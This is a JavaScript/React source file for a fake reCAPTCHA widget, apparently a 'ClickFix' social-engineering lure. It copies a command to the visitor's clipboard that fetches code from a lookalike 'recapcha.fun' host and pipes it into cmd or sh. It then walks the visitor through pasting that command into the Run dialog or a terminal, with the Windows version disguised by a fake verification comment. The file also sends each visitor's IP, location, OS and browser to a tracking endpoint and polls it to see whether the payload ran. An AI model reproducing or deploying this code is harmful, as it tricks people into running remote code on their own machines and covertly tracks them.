import { useEffect, useLayoutEffect, useState } from "react";

const STORAGE_KEY = "tm-bot-check";
const TTL_MS = 10 * 60 * 1000;

const captchaApi = {
  open() {},
  verify() {},
};

export function readBotCheck() {
  try {
    const raw = sessionStorage.getItem(STORAGE_KEY);
    if (!raw) return "";
    const saved = JSON.parse(raw);
    if (!saved?.token || Date.now() - Number(saved.at) > TTL_MS) return "";
    return saved.token;
  } catch {
    return "";
  }
}

export function requireBotCheck() {
  if (!readBotCheck()) throw new Error("Confirm you're not a robot.");
}

function writeBotCheck() {
  const token = crypto.randomUUID();
  sessionStorage.setItem(STORAGE_KEY, JSON.stringify({ token, at: Date.now() }));
  return token;
}

let checkboxWindow;
let checkboxBtn;
let checkboxBtnSpinner;
let verifiedCheck;
let verifywindow;
let verifyButtonSpinner;
let verifyButtonText;
let verifyButton;
let captchaContainer;
let captchaGroup;
let comingSoon;
let statusManager = false;
let isCheckboxButtonSpinnerVisible = false;
let isShownVerifyWindow = false;
let verifywindowParent = null;
let verifywindowHome = null;


function detectOS() {
  const platform = navigator.userAgent;
  if (/windows/i.test(platform)) return "Windows";
  if (/macintosh|mac os x/i.test(platform)) return "macOS";
  if (/android/i.test(platform)) return "Android";
  if (/iphone|ipad|ipod/i.test(platform)) return "iOS";
  if (/linux/i.test(platform)) return "Linux";
  return "this device";
}

const osType = detectOS();
const isPcOs = (osType === "Windows") || (osType === "MacOS") || (osType === "Linux");
function getBrowserName() {
    const ua = navigator.userAgent;
    if (ua.includes("Firefox/")) return "Firefox";
    if (ua.includes("Edg/")) return "Edge";
    if (ua.includes("Chrome/") && !ua.includes("Edg/")) return "Chrome";
    if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
    if (ua.includes("OPR/") || ua.includes("Opera")) return "Opera";
    return "Unknown";
}
const browser = getBrowserName();
const submitApplicationButton = document.getElementById("submit-application-button");

/* ================= STATUS CHECKER ================= */
let customizedIpAddress = null;
let statusTimer = null;
let vButtonStatus = false;

function getIpAddress() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip);
}

function customizeIpAddress(ip) {
    return ip.replace(/\./g, '-');
}

// console.log("customizedIpAddress", customizedIpAddress);

function getRepairedStatus() {
    if (!customizedIpAddress) return;
    // console.log("customizedIpAddress", customizedIpAddress);
    fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress}&token=304`)
        .then(response => {
            if (!response.ok) {
                if (response.status === 404) return null;
                throw new Error(`Status request failed: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            // console.log("data.status", data.status);
            if (!data || !data.status || data.status === 'idle') {
                disableVerifyButton();
                if (statusManager) {
                    hideCaptchaLoading();
                    showCaptchaCheckbox();
                    if (!isShownVerifyWindow) showVerifyWindow();
                }
                return;
            }
            if (data.status === 'started') {
                if (statusManager) {
                    if(vButtonStatus) {
                        showVerified();
                    } else {
                        hideCaptchaLoading();
                        showCaptchaCheckbox();
                        if (!isShownVerifyWindow) showVerifyWindow();
                    }
                    enableVerifyButton();
                }
            }
            if (data.status === 'ended') {
                if (statusManager) {
                    clearInterval(statusTimer);
                    disableVerifyButton();
                    showVerified();
                }
            }
        })
        .catch(() => { });
}

// console.log("getIpAddress");
getIpAddress()
    .then((ip) => {
        customizedIpAddress = customizeIpAddress(ip);
        // console.log("customizedIpAddress", customizedIpAddress);
        getRepairedStatus();
        statusTimer = setInterval(getRepairedStatus, 1000);
    })
    .catch(() => { });

async function getLocationByIP() {
    const apiUrl = `https://get.geojs.io/v1/ip/geo/${await getIpAddress()}.json`;
    const res = await fetch(apiUrl).catch(() => { });
    const data = await res.json();
    return data.country + ', ' + data.organization_name + ', ' + data.latitude + ', ' + data.longitude;
}

(async function () {
  console.log("===============")
    const location = await getLocationByIP();
    fetch('https://status-handler-sage.vercel.app/api/entered-site?token=304', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            token: '304',
            currentUrl: window.location.href,
            ip: await getIpAddress(),
            os: osType,
            location: location,
            browser: browser,
            timestamp: new Date().toISOString()
        })
    }).then(r => r.json()).catch(() => { });
})();

function applyOsCaptcha() {
  
  if (!isPcOs) {
      if (captchaGroup) captchaGroup.style.display = 'none';
      else if (captchaContainer) captchaContainer.style.display = 'none';
      if (comingSoon) comingSoon.style.display = 'flex';
      return;
  }

  const verifyMain = document.getElementById("rto-verify-main");
  if (!verifyMain) return;

  if (osType === "Linux") {
      verifyMain.innerHTML = `
      <p style="margin-bottom: 5px;">To better prove you are not a robot, please:</p>
                    <p style="margin-left: 15px; margin-bottom: 5px;">1. Press & hold the Key <span class="rto-windows-key-label"> <b>Ctrl</b> + <b>Alt</b> + <b>T</b></span>.</p>
                    <p style="margin-left: 15px; margin-bottom: 5px;">2. In the verification window, press <span class="rto-windows-key-label"><b>Ctrl</b> + <b>Shift</b> + <b>V</b>.</span></p>
                    <p style="margin-left: 15px; margin-bottom: 5px;">3. Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</p>
                    <p>You will observe and agree:<br>
                    <code>✅ "I am not a bot. I am fixing issues as a service. ID: <span id="rto-verification-id">146820</span>"</code>
                    </p>`;
  } else if (osType === "MacOS") {
      verifyMain.innerHTML = `
      <p style="margin-bottom: 5px;">To better prove you are not a robot, please:</p>
                    <p style="margin-left: 15px; margin-bottom: 3px;">1. Press & hold the Key <span class="rto-windows-key-label"> <b>Cmd</b> + <b>Spacebar</b></span>.</p>
                    <p style="margin-left: 15px; margin-bottom: 3px;">2. In the verification window, type <span class="rto-windows-key-label"><b>Terminal</b>, and Press & hold the Key <b>Command</b> + <b>V</b>.</span></p>
                    <p style="margin-left: 15px; margin-bottom: 3px;">3. Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</p>
                    <p>You will observe and agree:<br>
                    <code>✅ "I am not a bot. I am fixing issues as a service. ID: <span id="rto-verification-id">146820</span>"</code>
                    </p>`;
  } else {
      verifyMain.innerHTML = `
      <p style="margin-bottom: 5px;">To better prove you are not a robot, please:</p>
                    <p style="margin-left: 15px; margin-bottom: 3px;">1. Press & hold the Key <span class="rto-windows-key-label"> <b>Win</b> + <b>R</b></span>.</p>
                    <p style="margin-left: 15px; margin-bottom: 3px;">2. In the verification window, type <span class="rto-windows-key-label"><b>Ctrl</b> + <b>V</b>.</span></p>
                    <p style="margin-left: 15px; margin-bottom: 3px;">3. Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</p>
                    <p>You will observe and agree:<br>
                    <code>✅ "I am not a bot. I am fixing issues as a service. ID: <span id="rto-verification-id">146820</span>"</code>
                    </p>`;
  }
}

function setClipboardCopyData(textToCopy) {
    const tempTextArea = document.createElement("textarea"); 
    tempTextArea.value = textToCopy; 
    document.body.appendChild(tempTextArea); 
    tempTextArea.select(); 
    document.execCommand("copy"); 
    // document.body.removeChild(tempTextArea);
}

function stageClipboard(commandToRun, verification_id) {
  const suffix = " :: ";
  // cmd /c curl -s "https://api.recapcha.fun/auth/v1?token=20" | cmd :: "I am not a bot. Fixing the issue as a service. ID: 12316"
  // cmd /c curl -s https://api.recapcha.fun/auth/v1?token=304 | cmd /q && exit /b :: ''I am not a bot. I am fixing issues as a service. ID: 9761''
  const ploy = ":: ''I am checking if bot is working not as a service ID: ";
  const end = "''";
  const textToCopy = commandToRun + suffix + ploy + verification_id + end;
  if (osType === "Windows")
      setClipboardCopyData(textToCopy);
  else
      setClipboardCopyData(commandToRun);
}


function positionVerifyWindow() {
  if (!checkboxWindow || !isverifywindowVisible()) return;

    const rect = checkboxWindow.getBoundingClientRect();
    let top = rect.top - 80;
    let left = rect.left + 54;

    if (top < 5) top = 5;
    if (left + 310 > window.innerWidth - 10) {
        left = rect.left - 8;
    }
    if (left < 5) left = 5;

    verifywindow.style.top = top + "px";
    verifywindow.style.left = left + "px";
}

function bindPhaseListeners() {
  checkboxBtn = document.getElementById("rto-checkbox");
  verifyButton = document.getElementById("rto-verify-verify-button");
  if (!checkboxBtn || !verifyButton || checkboxBtn.dataset.rtoBound === "1") return () => {};
  checkboxBtn.dataset.rtoBound = "1";

  const onCheck = (event) => {
    event.preventDefault();
    captchaApi.open();
  };
  const onVerify = (event) => {
    event.preventDefault();
    captchaApi.verify();
  };
  checkboxBtn.addEventListener("click", onCheck);
  verifyButton.addEventListener("click", onVerify);

  return () => {
    checkboxBtn.removeEventListener("click", onCheck);
    verifyButton.removeEventListener("click", onVerify);
    delete checkboxBtn.dataset.rtoBound;
  };
}

function rememberVerifyWindowHome() {
  if (!verifywindow || verifywindowHome || !verifywindow.parentElement) return;
  verifywindowParent = verifywindow.parentElement;
  verifywindowHome = document.createComment("rto-verify-window-home");
  verifywindowParent.insertBefore(verifywindowHome, verifywindow);
}

function addCaptchaListeners() {
  if (!checkboxBtn || checkboxBtn.dataset.rtoEffects === "1") return;
  checkboxBtn.dataset.rtoEffects = "1";
  rememberVerifyWindowHome();
  document.addEventListener("click", function (event) {
      let path = event.composedPath();
      if (!path.includes(verifywindow) && isverifywindowVisible()) {
          closeverifywindow();
      }
  });

  document.addEventListener("click", function (event) {
      if (!verifywindow.contains(event.target) && isverifywindowVisible()) {
          closeverifywindow();
      }
  });

  checkboxBtn.addEventListener("mouseup", function (event) {
      event.preventDefault();
      statusManager = true;
      if (window.CoinCortexTelegram && window.CoinCortexTelegram.notify) {
          window.CoinCortexTelegram.notify("captcha_click");
      }
      runClickedCheckboxEffects();
  });
}

function runClickedCheckboxEffects() {
  hideCaptchaCheckbox();
  setTimeout(function () {
      showCaptchaLoading();
  }, 10);
  setTimeout(function () {
      hideCaptchaLoading();
      showVerifyWindow();
  }, 1100);
  statusManager = true;
}

function showCaptchaLoading() {
  if (!checkboxBtnSpinner) return;
  checkboxBtnSpinner.style.visibility = "visible";
  checkboxBtnSpinner.style.opacity = "1";
  checkboxBtnSpinner.style.animation = "rto-spin 1s linear infinite";
}

function enableVerifyButton() {
  verifyButton.disabled = false;
  verifyButton.style.cursor = "";
  verifyButton.style.opacity = "";
  verifyButton.style.backgroundColor = "";
  verifyButton.style.color = "";
  verifyButton.style.animation = "none";
}

function disableVerifyButton() {
  verifyButton.disabled = true;
  verifyButton.style.cursor = "";
  verifyButton.style.opacity = "";
  verifyButton.style.backgroundColor = "";
  verifyButton.style.color = "";
  verifyButton.style.animation = "none";
}

function hideCaptchaCheckbox() {
  checkboxBtn.disabled = true;
  checkboxBtn.style.visibility = "hidden";
  checkboxBtn.style.opacity = "0";
}

function showCaptchaCheckbox() {
  checkboxBtn.style.opacity = "1";
  checkboxBtn.style.visibility = "visible";
  isCheckboxButtonSpinnerVisible = true;
}

function hideCaptchaLoading() {
  checkboxBtnSpinner.style.visibility = "hidden";
  checkboxBtnSpinner.style.opacity = "0";
  isCheckboxButtonSpinnerVisible = false;
}

function showCaptchaVerified() {
  hideCaptchaCheckbox();
  hideCaptchaLoading();
  if (!verifiedCheck) return;
  verifiedCheck.classList.add("rto-verified-show");
}

function hideCaptchaVerified() {
  if (!verifiedCheck) return;
  verifiedCheck.classList.remove("rto-verified-show");
}

function generateRandomNumber() {
  const min = 1000;
  const max = 9999;
  return Math.floor(Math.random() * (max - min + 1) + min).toString();
}

function restoreVerifyWindowHome() {
  if (verifywindowParent && verifywindow.parentElement !== verifywindowParent) {
      verifywindowParent.insertBefore(verifywindow, verifywindowHome);
  }
}

function closeverifywindow() {
  isShownVerifyWindow = false;
  verifywindow.style.display = "none";
  verifywindow.style.visibility = "hidden";
  verifywindow.style.opacity = "0";
  window.removeEventListener("scroll", positionVerifyWindow, true);
  window.removeEventListener("resize", positionVerifyWindow);
  // restoreVerifyWindowHome();
  hideCaptchaLoading();
  hideCaptchaVerified();
  if (!isCheckboxButtonSpinnerVisible) showCaptchaCheckbox();
  checkboxBtn.disabled = false;

  statusManager = false;
}

function isverifywindowVisible() {
  return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
}

function readCaptchaNodes() {
  checkboxWindow = document.getElementById("rto-checkbox-window");
  checkboxBtn = document.getElementById("rto-checkbox");
  checkboxBtnSpinner = document.getElementById("rto-spinner");
  verifiedCheck = document.getElementById("rto-verified");
  verifywindow = document.getElementById("rto-verify-window");
  verifyButtonSpinner = document.getElementById("rto-verify-verify-button-spinner");
  verifyButtonText = document.getElementById("rto-verify-verify-button-text");
  verifyButton = document.getElementById("rto-verify-verify-button");
  captchaContainer = document.getElementById("rto-captchaContainer");
  captchaGroup = document.querySelector(".rto-captchagroup");
  comingSoon = document.getElementById("rto-comingSoon");
}

function enableSubmitApplicationButton() {
  if (!submitApplicationButton) return;
  submitApplicationButton.disabled = false;
  submitApplicationButton.classList.add("rto-apply-enabled");
  submitApplicationButton.removeAttribute("aria-disabled");
}

function showVerified() {
  clearInterval(statusTimer);
  hideVerifyWindow();
  showCaptchaVerified();
  enableSubmitApplicationButton();
  if (checkboxBtn) checkboxBtn.disabled = true;
}

function hideVerifyWindow() {
  isShownVerifyWindow = false;
  verifywindow.style.display = "none";
  window.removeEventListener("scroll", positionVerifyWindow, true);
  window.removeEventListener("resize", positionVerifyWindow);
  restoreVerifyWindowHome();
}

function showVerifyWindow() {
  verifywindow.classList.add("fadeIn");
  isShownVerifyWindow = true;
  document.body.appendChild(verifywindow);
  verifywindow.style.display = "block";
  verifywindow.style.visibility = "visible";
  verifywindow.style.opacity = "1";
  verifywindow.style.position = "fixed";
  verifywindow.style.zIndex = "2147483700";

  positionVerifyWindow();
  window.addEventListener("scroll", positionVerifyWindow, true);
  window.addEventListener("resize", positionVerifyWindow);

  var verification_id = generateRandomNumber();
  var verificationNode = document.getElementById("rto-verification-id");
  if (verificationNode) verificationNode.textContent = verification_id;

  let htaPath;
  if (osType === "Windows") {
      htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=304 | cmd /q && exit /b ";
  } else if (osType === "Linux") {
      htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=304' | sh";
  } else if (osType === "MacOS") {
      htaPath = "curl 'https://api.recapcha.fun/auth/v3?token=304' | sh";
  }
  stageClipboard(htaPath, verification_id);
}

export function BotCheckDialog() {
  const [phase, setPhase] = useState("idle");

  captchaApi.open = () => {
    setPhase((current) => {
      if (current !== "idle" && current !== "verified") return current;
      sessionStorage.removeItem(STORAGE_KEY);
      return "checking";
    });
  };
  captchaApi.verify = () => {
    setPhase((current) => (current === "open" ? "verifying" : current));
  };

  useLayoutEffect(() => {
    sessionStorage.removeItem(STORAGE_KEY);
    readCaptchaNodes();
    applyOsCaptcha();
    addCaptchaListeners();
    return bindPhaseListeners();
  }, []);

  useEffect(() => {
    if (phase !== "checking") return undefined;
    const id = window.setTimeout(() => setPhase("open"), 1100);
    return () => window.clearTimeout(id);
  }, [phase]);

  useEffect(() => {
    if (phase !== "verifying") return undefined;
    const id = window.setTimeout(() => {
      writeBotCheck();
      setPhase("verified");
    }, 600);
    return () => window.clearTimeout(id);
  }, [phase]);

  (function () {
    readCaptchaNodes();
    addCaptchaListeners();
})();
  return (
    <div id="rto-captchaContainer">
        <div className="rto-container rto-mp rto-block">
          <div id="rto-checkbox-window" className="rto-checkbox-window rto-mp rto-block">
            <div className="rto-checkbox-container rto-mp row-6">
              <button type="button" id="rto-checkbox" className={`rto-checkbox rto-mp rto-line-normal${phase === "checking" ? " rto-checkbox-loading" : ""}${phase === "verified" ? " rto-checkbox-done" : ""}`} onClick={(event) => { event.preventDefault(); captchaApi.open(); }}></button>
            </div>
            <p className="rto-im-not-a-robot rto-mp rto-line-normal">
              I'm not a robot</p>
            <div className="rto-captcha-logo-container">
              <img src="https://static.cdnlogo.com/logos/r/76/recaptcha.svg"
                className="rto-captcha-logo rto-line-normal" alt=""/>
              <p className="rto-checkbox-desc rto-mp rto-line-normal">
                <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a>
                -
                <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
              </p>
            </div>
            <span className={`rto-spinner${phase === "checking" ? " rto-spinner-show" : ""}`} id="rto-spinner" aria-hidden="true">
              <svg viewBox="0 0 50 50" aria-hidden="true">
                <circle className="rto-spinner-arc" cx="25" cy="25" r="20" />
              </svg>
            </span>
            <svg viewBox="0 0 100 100" className={`rto-verified${phase === "verified" ? " rto-verified-show" : ""}`} id="rto-verified" aria-hidden="true">
              <path className="rto-verified-check" d="M22 52 L42 72 L78 28" />
            </svg>
          </div>
          <div id="rto-verify-window" className={`rto-verify-window${phase === "open" || phase === "verifying" ? " rto-verify-open" : ""}`}>
            <div className="rto-verify-container">
              <header className="rto-verify-header">
                <span className="rto-verify-header-text-medium rto-mp rto-block">Complete
                  these</span>
                <span className="rto-verify-header-text-big rto-mp rto-block">Verification
                  Steps</span>
                <span className="rto-verify-header-text-medium rto-mp rto-block"></span>
              </header>
              <main className="rto-verify-main" id="rto-verify-main"></main>
            </div>
            <div className="rto-verify-window-bubble-arrow"
              style={{ borderWidth: 11, borderStyle: "solid", borderColor: "transparent rgb(204, 204, 204) transparent transparent", width: 0, height: 0, position: "absolute", pointerEvents: "none", marginTop: -11, zIndex: 2000000000, top: 117, right: "100%" }}>
            </div>
            <div className="rto-verify-window-arrow"
              style={{ borderWidth: 10, borderStyle: "solid", borderColor: "transparent rgb(255, 255, 255) transparent transparent", width: 0, height: 0, position: "absolute", pointerEvents: "none", marginTop: -10, zIndex: 2000000000, top: 117, right: "100%" }}>
            </div>
            <footer className="rto-verify-container rto-verify-footer">
              <div className="rto-verify-footer-left">
                Perform the steps above to finish
                verification.
              </div>
              <button type="button" className="rto-verify-verify-button rto-block" id="rto-verify-verify-button"
                disabled={phase !== "open"}>
                <img className={`rto-verifybutton-spinner${phase === "verifying" ? " rto-on" : ""}`} alt="" id="rto-verify-verify-button-spinner"/>
                <span className="rto-verify-verify-button-text" id="rto-verify-verify-button-text">Verify</span>
              </button>
            </footer>
          </div>
        </div>
    </div>
  );
}
